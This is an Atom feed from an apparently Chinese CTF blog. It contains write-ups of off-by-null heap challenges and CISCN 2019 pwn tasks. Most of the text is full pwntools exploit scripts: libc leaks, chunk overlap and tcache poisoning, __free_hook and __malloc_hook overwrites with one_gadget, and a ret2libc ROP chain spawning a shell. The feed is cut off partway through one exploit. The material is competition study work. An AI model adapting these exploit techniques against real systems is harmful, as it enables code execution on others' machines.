<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Room of Requirement</title>
  
  <subtitle>pwn what you want</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://siriuswhiter.tk/"/>
  <updated>2019-06-10T05:05:29.903Z</updated>
  <id>http://siriuswhiter.tk/</id>
  
  <author>
    <name>Sirius Whiter</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>off-by-null --more challenge</title>
    <link href="http://siriuswhiter.tk/2019/06/08/off-by-null-more-challenge/"/>
    <id>http://siriuswhiter.tk/2019/06/08/off-by-null-more-challenge/</id>
    <published>2019-06-08T00:49:05.000Z</published>
    <updated>2019-06-10T05:05:29.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>之前随便出的题</p><h2 id="障碍"><a href="#障碍" class="headerlink" title="障碍"></a>障碍</h2><p>低版本libc，没有开启PIE，常见的四项功能都有，edit中存在off-by-null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void get_str(char *ptr,int size)&#123;</span><br><span class="line">    int tmp=0;</span><br><span class="line">    if(size&lt;0)&#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;size;i++)&#123;</span><br><span class="line">        read(0,(ptr+i),1);</span><br><span class="line">        tmp = i;</span><br><span class="line">        if(*(ptr+i)==&apos;\n&apos;)&#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *(ptr+tmp+1)=0;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前信安大赛提供的赛题就是这个难度的洞，上面为源码。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>没有开启PIE其实就很简单，基本上各方面都没有太多限制，通过溢出overlap来控制指针，下面要么直接控制修改malloc_hook处，要么麻烦一点改bss段指针再任意地址写getshell，之前是直接修改为one_gadget后条件不满足，顺便就把PIE给关了，难度低一点友好点没啥坏处。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./tinynote&apos;)</span><br><span class="line">elf = ELF(&apos;./tinynote&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,note):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;Size: &apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;Note: \n&apos;,note)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,size,note):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line">        sh.sendlineafter(&apos;size: &apos;,str(size))</span><br><span class="line">        sh.sendlineafter(&apos;Note: \n&apos;,note)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendlineafter(&apos;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">        sh.sendlineafter(&apos;index: &apos;,str(idx))</span><br><span class="line"></span><br><span class="line">#--------------over lapping---------------</span><br><span class="line">add(0x90,&apos;0&apos;)</span><br><span class="line">add(0x18,&apos;1&apos;)</span><br><span class="line">add(0x18,&apos;2&apos;)</span><br><span class="line">add(0x110,&apos;3&apos;*0xf0+p64(0x100)+p64(0x21))</span><br><span class="line">add(0x18,&apos;4&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">edit(2,0x18,&apos;2&apos;*0x10+p64(0xe0))</span><br><span class="line">dele(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#-------------leak libc---------------------</span><br><span class="line">add(0x90,&apos;0&apos;)</span><br><span class="line">show(1)</span><br><span class="line">leak = u64(sh.recv(8))</span><br><span class="line">libc_base = leak-88-0x3c4b20</span><br><span class="line">print hex(libc_base)</span><br><span class="line">one = libc_base +0x4526a#+libc.symbols[&apos;system&apos;]</span><br><span class="line">#--------------------------------------</span><br><span class="line">#edit(1,0x18,p64(leak)+p64(leak-88-0x33))</span><br><span class="line">#add(0x60,&apos;a&apos;*0x13)</span><br><span class="line">add(0x18,&apos;3&apos;)</span><br><span class="line">add(0x60,&apos;5&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">edit(5,8,p64(0x60203d))</span><br><span class="line">add(0x60,&apos;2&apos;)</span><br><span class="line">add(0x60,&apos;\x00&apos;*0x13+p64(0x90)+p64(1)+p64(libc.symbols[&apos;__free_hook&apos;]+libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(0,8,p64(one))</span><br><span class="line">dele(2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>西湖论剑的一道题目貌似</p><h2 id="障碍-1"><a href="#障碍-1" class="headerlink" title="障碍"></a>障碍</h2><p>libc版本升级到2.27左右，存在tcache机制，许多操作开始需要绕过tcache机制来实现，但整体思路没有太大的变化。<br>同时这个题的溢出点从edit到了add，相对麻烦一点就是了。</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>多分配一些chunk来将tcache填满，之后对剩下的chunk进行off-by-null实现overlap，好处就是tcache减少了对size的检查，后面更容易实现</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;xihu&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;xihu&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendlineafter(&apos;size:\n&apos;,str(size))</span><br><span class="line">sh.sendlineafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;3&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;2&apos;)</span><br><span class="line">sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,con):</span><br><span class="line">sh.sendlineafter(&apos;command:\n&apos;,&apos;4&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;enter index:\n&apos;,str(index))</span><br><span class="line">    sh.sendafter(&apos;content:\n&apos;,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0xf7,str(i)*0x20)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">#----------------unsorted bin leak libc-------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf8,&apos;&apos;)#0</span><br><span class="line">for i in range(1,7):</span><br><span class="line">    add(0xf7,str(i)) #1-6</span><br><span class="line"></span><br><span class="line">add(0xf7, &apos;7&apos;) #7</span><br><span class="line">edit(7, &apos;a&apos; *  8)</span><br><span class="line">show(7)</span><br><span class="line">sh.recvuntil(&apos;a&apos;*8)</span><br><span class="line">libc_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;)) - 0x3ebca0</span><br><span class="line">print &quot;libc: &quot;+hex(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">one_gadget = libc_base + 0x4f322</span><br><span class="line"></span><br><span class="line">#---------------tcache leak heap -------------------------------------# </span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">edit(0,&apos;0&apos;)</span><br><span class="line">show(0)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))-0x730</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#------fake chunk unlink #---chunk extend cover fd ptr--------------#</span><br><span class="line"></span><br><span class="line">chunk0_addr = heap_base + 0x850</span><br><span class="line">fake_chunk = chunk0_addr + 0x10</span><br><span class="line"></span><br><span class="line">pay = p64(0)+p64(0xf0)+p64(fake_chunk)+p64(fake_chunk)+&apos;a&apos;*0xd0+p64(0xf0)</span><br><span class="line"></span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(8)</span><br><span class="line"></span><br><span class="line">for i in range(1,7):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">dele(7)</span><br><span class="line"></span><br><span class="line">for i in range(1,8):</span><br><span class="line">    add(0xf7,str(i))</span><br><span class="line"></span><br><span class="line">add(0xf7,&apos;8&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">dele(8)</span><br><span class="line">pay = p64(0)+p64(0x101)+p64(free_hook)</span><br><span class="line">edit(0,pay)</span><br><span class="line"></span><br><span class="line">add(0,&apos;&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0xf7,&apos;&apos;)</span><br><span class="line">edit(8,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>rctf 2019-babyheap</p><h2 id="障碍-2"><a href="#障碍-2" class="headerlink" title="障碍"></a>障碍</h2><p>较低版本libc，开启PIE，但是禁用了fastbin，同时关闭了system execve的系统调用<br>这样基本上无法覆盖bss段的指针，即使想办法可以控制malloc_hook或free_hook指针，也无法直接系统调用getshell</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>通过chunk overlap泄露libc地址，再次调用通过house of storm控制<strong>free_hook，<br>把</strong>free_hook地址设置为setcontext函数，从而控制程序流执行mprotect函数把__free_hook所在内存也修改为可执行，<br>然后读入我们新的shellcode，在跳到新的shellcode去执行getshell。</p><p>另一种思路，泄露堆地址与libc地址，写rop, shellcode到heap，largebin attack &amp; unsortbin attack直接在libc上的free_hook分配chunk<br>将栈转移到heap上，执行rop，执行shellcode getshell。</p><p>这里的shellcode都是通过open read write来实现flag的读取。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><p>待补充<br><a href="https://xz.aliyun.com/t/5216#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/5216#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;level-0&quot;&gt;&lt;a href=&quot;#level-0&quot; class=&quot;headerlink&quot; title=&quot;level 0&quot;&gt;&lt;/a&gt;level 0&lt;/h1&gt;&lt;p&gt;之前随便出的题&lt;/p&gt;
&lt;h2 id=&quot;障碍&quot;&gt;&lt;a href=&quot;#障碍&quot; class=&quot;heade
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2019 pwn</title>
    <link href="http://siriuswhiter.tk/2019/06/04/ciscn-2019-pwn/"/>
    <id>http://siriuswhiter.tk/2019/06/04/ciscn-2019-pwn/</id>
    <published>2019-06-04T13:20:37.000Z</published>
    <updated>2019-06-07T02:12:03.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><h2 id="题目-amp-amp-分析"><a href="#题目-amp-amp-分析" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>ret2libc</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">#coding = utf8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;Emachine&apos;)</span><br><span class="line">elf = ELF(&apos;Emachine&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;172.29.32.110&apos;,&apos;8888&apos;)</span><br><span class="line">elf = ELF(&apos;Emachine&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def en(enc):</span><br><span class="line">s = []</span><br><span class="line">res = 0</span><br><span class="line">for i in range(8):</span><br><span class="line">sk = enc % 0x100</span><br><span class="line">enc = (enc - sk)/0x100 </span><br><span class="line">s.append(sk)</span><br><span class="line"></span><br><span class="line">for x in s:</span><br><span class="line">if x&gt;47 and x &lt;57:</span><br><span class="line">x ^= 0xf</span><br><span class="line">elif x&lt;= 64 and x &gt;90:</span><br><span class="line">x ^= 0xe</span><br><span class="line">elif x&lt;=96 and x&gt;122:</span><br><span class="line">x ^= 0xd</span><br><span class="line">res = x + res*0x100</span><br><span class="line">print s</span><br><span class="line">return res</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000400c83</span><br><span class="line">#main = 0x400b28</span><br><span class="line">start = 0x400790</span><br><span class="line">sh.sendlineafter(&quot;Input your choice!\n&quot;,&apos;1&apos;)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(elf.got[&apos;puts&apos;])+p64(elf.symbols[&apos;puts&apos;])+p64(start)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.recvuntil(&apos;oooooooo&apos;)</span><br><span class="line">sh.recvuntil(&apos;\n&apos;)</span><br><span class="line">leak = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">#print hex(e)</span><br><span class="line">#leak =en(e)</span><br><span class="line">print hex(leak)</span><br><span class="line">system = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;system&apos;]</span><br><span class="line">#environ = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;environ&apos;]</span><br><span class="line">read = leak - libc.symbols[&apos;puts&apos;] +libc.symbols[&apos;read&apos;]</span><br><span class="line">print hex(system)</span><br><span class="line">print hex(read)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">pop_rsi_r15 = 0x0000000000400c81</span><br><span class="line">#pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(0x602080)+p64(0)+p64(read)+p64(start)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(elf.symbols[&apos;gets&apos;])+p64(start)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.sendline(&apos;/bin/sh\x00&apos;)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">pay = &apos;a&apos;*0x50+&apos;bbbbbbbb&apos;+p64(pop_rdi)+p64(0x6020a8)+p64(system)+p64(start)</span><br><span class="line">sh.send(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><p>当时没看，血亏。</p><h2 id="题目-amp-amp-分析-1"><a href="#题目-amp-amp-分析-1" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>溢出+uaf漏洞</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line">#coding = utf8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./pwn&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.23.so&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;pwn&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(size,name):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;size: \n&quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;name: \n&quot;,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index: \n&apos;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;weapon:\n&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def backdoor(index):</span><br><span class="line">    sh.sendlineafter(&quot;Command: \n&quot;,&apos;666&apos;)</span><br><span class="line">    sh.sendlineafter(&quot;weapon:\n&quot;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(0x100,&apos;a\n&apos;)</span><br><span class="line">create(0x60,&apos;b\n&apos;)</span><br><span class="line">create(0x60,&apos;c\n&apos;)</span><br><span class="line">create(0x60,&apos;a&apos;*0x10+p64(0x110)+p64(0x41)+&apos;\n&apos;)</span><br><span class="line">dele(0)</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil(&quot;attack_times: &quot;)</span><br><span class="line">libc.base = int(sh.recvuntil(&quot;\n&quot;,drop=True))-0x3c4b78</span><br><span class="line">print hex(libc.base)</span><br><span class="line">malloc_hook = libc.base+libc.symbols[&apos;__malloc_hook&apos;]#0x3c4b00</span><br><span class="line">print hex(malloc_hook)</span><br><span class="line">one_gadget = libc.base+0xf02a4#0x4526a</span><br><span class="line"></span><br><span class="line">create(0x100,&apos;a&apos;*0xf0+p64(0x110)+p64(0x111))</span><br><span class="line">dele(2)</span><br><span class="line">dele(1)</span><br><span class="line">create(0x100,&apos;a&apos;*0x58+p64(0x71)+p64(malloc_hook-0x23)+&apos;\n&apos;)</span><br><span class="line">create(0x60,&apos;b\n&apos;)</span><br><span class="line">create(0x60,&apos;aaa&apos;+p64(one_gadget)+&apos;\n&apos;)</span><br><span class="line">#dele(7)</span><br><span class="line">#create(0x4f,&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>没注意到一个煞笔漏洞，被忽悠的以为有size检测，把好好的一道送分题送了</p><h2 id="题目-amp-amp-分析-2"><a href="#题目-amp-amp-分析-2" class="headerlink" title="题目&amp;&amp;分析"></a>题目&amp;&amp;分析</h2><p>开局可以泄露libc地址，本来用的是fmt，结果可以直接泄露。之后uaf</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 